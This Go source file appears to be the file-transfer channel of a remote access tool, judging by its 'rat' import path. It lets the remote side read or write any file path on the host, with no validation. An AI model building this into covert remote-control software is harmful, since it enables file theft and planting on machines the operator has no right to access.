package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"rat/internal"
)

type ChannelTransfer struct {
	Path   string
	Upload bool
	Offset int64
}

func (ch ChannelTransfer) Open(r io.ReadWriteCloser, c *Connection) error {
	defer r.Close()

	var fp *os.File
	var err error

	binary.Read(r, binary.LittleEndian, &ch.Upload)
	binary.Read(r, binary.LittleEndian, &ch.Offset)
	ch.Path, err = shared.ReadString(r)

	fmt.Println("Transferring", ch.Path)

	if ch.Upload {
		fp, err = os.Open(ch.Path)

		if err != nil {
			panic(err)
		}

		if ch.Offset > 0 {
			_, err = fp.Seek(ch.Offset, io.SeekStart)
			if err != nil {
				panic(err)
			}
		}

		_, _ = io.Copy(r, fp)
	} else {
		fp, err = os.OpenFile(ch.Path, os.O_RDWR|os.O_CREATE, 0666)
		if err != nil {
			panic(err)
		}

		if ch.Offset > 0 {
			_, err = fp.Seek(ch.Offset, io.SeekStart)
			if err != nil {
				panic(err)
			}
		}

		io.Copy(fp, r)
	}

	fp.Sync()
	fp.Close()

	return err
}
